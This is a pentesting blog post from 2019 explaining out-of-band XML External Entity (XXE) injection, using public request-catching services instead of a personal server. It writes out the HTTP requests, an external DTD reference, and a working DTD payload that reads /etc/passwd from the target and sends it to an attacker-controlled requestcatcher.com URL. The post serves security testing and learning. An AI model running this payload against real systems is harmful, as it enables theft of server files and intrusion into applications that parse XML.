---
layout:     post
title:      "XML External Entity (XXE) Injection Without Personal Servers"
date:       2019-06-22
author:     "Tech"
header-img: "img/post-XXE-injection-without-personal-servers.jpeg"
tags:
    - Pentesting
    - XXE
---

## XML External Entity (XXE) Injection Without Personal Servers

--------

Most post I read online regarding XXEs introduce the idea of spinning up a quick webserver to deliver and recieve content. While testing out some XXEs vulnerabilities, I didn't have the luxury of port forwarding my network, or spinning up a digital ocean droplet. I found a clever way to still conduct my testing under these constraints that I'll be talking about in this post. 

---------

### What is XXE?

An XML External Entity (XXE) injection is a serious flaw that allows an attacker to read local files on the server, access internal networks, scan internal ports, or execute commands on a remote server. It targets applications that parse XMLs.

This attack occurs when an XML input containing references to an external entity is processed by a weakly configured XML parser. The attacker takes advantage of it by embedding malicious inline DOCTYPE definition in the XML data. When the web server processes the malicious XML input, the entities are expanded, which results in potentially gaining access to a web server's file system, remote file system access, or establishing  connections to arbitrary hosts over HTTP/HTTPS.



---------

### Post Request

I'll assume you already know that the framework your working is can accept XML entities.

We'll typically see a regular post request look like:

```header
POST /login-form HTTP/1.1
Host: vulnerable.host
User-Agent: techryptic
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

Turning the above POST request into an XML request by removing some clutter, and changing the Content-type header.

```header
POST /login-form HTTP/1.1
Host: vulnerable.host
User-Agent: techryptic
Connection: close
Content-Type: text/xml
Content-Length: 30

<?xml version="1.0"?>
<test>tested</test>
```

---------

### Serving the DTD

A "Valid" XML document is a "Well Formed" XML document, which also conforms to the rules of a DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "WEBSITE/test.dtd">
<test>&e1;</test>
```

The DOCTYPE declaration, in the example above, is a reference to an external DTD file.

In this case, we'll be supplying an external DTD. This is what spark the making of this post. Since I didn't want to setup port forward on my home network, or had any usable droplets from digital ocean on hand. The best way was to chain it with various online catchers.

---------
### Request Catcher

Just as the title says, the last request made will be set to [requestcatcher.com](requestcatcher.com). Set up a URL, in this case I set: 

> https://tech.requestcatcher.com

We'll inject this URL in the callback in the webhooking session. All in all, here is where we will see the contents of the command we used, in this case it's the contents of /etc/passwd on the webserver.

---------
### Webhooking

Example url: 
>webhook.site/aaf35306-2e6a
Be sure to use this URL in the 'Serving the DTD' section, replace WEBSITE/test.dtd with this URL.

I went with [https://webhook.site](https://webhook.site) for catching the test.dtd request. One great option is that your able to 'Edit' the URL information on this hook.

You'll want to insert the below into the Response body of the webhook.site site. Add in the Request Catcher URL from above to catch the response of the command.

```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'https://tech.requestcatcher.com?/test?%p1;'>">
%p2;
```
This DTD will force the XML parser to read the content of /etc/passwd and assigned it to the variable p1. Then it will create another variable p2 that contains a link to your malicious server and the value of p1. Finally it will print the value of p2 using the %p2.

---------
### Game Play

A quick break down:

We sent a post request calling out an external DTD (webhook.site), on the webhook site. On our webhook.site, we setup the response body to read the /etc/passwd file, and send those results to the request catcher website. The request catcher will read all request and print out what is shown. 

All in all:

![](/img/in-post/post-js-version/xxe-passwd.png)

---------
### Notes

You don't need to run with HTTPS for everything. I only got the above results after switching all URLs to http.

External Link with valuable Information:

>[https://pentesterlab.com/exercises/play_xxe](https://pentesterlab.com/exercises/play_xxe) 

---------
